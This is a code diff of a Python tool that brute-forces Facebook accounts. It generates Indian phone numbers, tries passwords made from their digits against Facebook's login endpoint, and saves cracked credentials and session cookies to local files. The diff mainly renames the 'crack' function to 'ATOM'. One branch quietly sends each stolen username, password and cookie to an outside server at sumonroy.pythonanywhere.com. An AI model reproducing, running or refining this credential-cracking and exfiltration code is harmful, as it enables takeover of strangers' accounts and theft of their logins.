@@ -100,7 +100,7 @@ def random_number():
             uid = '+91' +uidd
             pww = [uidd[:6],uidd[:8],uidd] 
          #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
-            XYZ.submit(crack, uid, pww, total_idz)
+            XYZ.submit(ATOM, uid, pww, total_idz)
     linex()
     print(f" \033[1;92m[\033[1;92m!\033[1;92m] Process Completed ")
     print(f" \033[1;92m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
@@ -108,15 +108,14 @@ def random_number():
     linex()
     input(f" \033[1;92m[\033[1;91m!\033[1;92m] Press Enter To Back ")
     menu()
-###-------[METHOD CRACK]-----------####
-def crack(uid, pww, total_idz):
+###-------[METHOD ATOM]-----------####
+def ATOM(uid, pww, total_idz):
     global loop
     global oks
     global cps
     global bkas
     x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\033[1;32m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
-    sys.stdout.write(f"\r{x}[SUMON] - \033[1;33m{loop} \033[1;92m{len(oks)} \033[1;91m{len(cps)}  ")
-    sys.stdout.flush()
+    sys.stdout.write(f"\r{x}[SUMON] - \033[1;33m{loop} \033[1;92m{len(oks)} \033[1;91m{len(cps)}");sys.stdout.flush()
     try:
         for pw in pww:
             session = requests.Session()
@@ -177,7 +176,7 @@ def crack(uid, pww, total_idz):
             'sec-fetch-dest': 'document',
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
-            response = session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',headers=headers,data=data,allow_redirects=False) #proxies=proxs)
+            response = session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=data,headers=headers,allow_redirects=False) #proxies=proxs)
             #print(response)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
@@ -193,9 +192,9 @@ def crack(uid, pww, total_idz):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [CRACK-OK] '+user+' | '+pw+'')
+                        print('\033[1;92m [ATOM-OK] '+user+' | '+pw+'')
                         print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;92m"+kuki)
-                        open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
+                        open("/sdcard/ATOM/ATOM-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                         oks.append(uid)
                         break
                     else:
@@ -204,9 +203,9 @@ def crack(uid, pww, total_idz):
                            statusok = (f"{user}|{pw}|{kuki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print('\033[1;92m [CRACK-OK] '+user+' | '+pw+'')
+                           print('\033[1;92m [ATOM-OK] '+user+' | '+pw+'')
                            print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;92m"+kuki)
-                           open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
+                           open("/sdcard/ATOM/ATOM-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                            oks.append(uid)
                            break
                 else:
@@ -214,8 +213,8 @@ def crack(uid, pww, total_idz):
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
-                open('/sdcard/CRACK/CP.txt', 'a').write( uid+' | '+pw+'\n')
+                #print('\033[1;91m [ATOM-CP] '+ids+' | '+pas+'')
+                open('/sdcard/ATOM/CP.txt', 'a').write( uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:continue
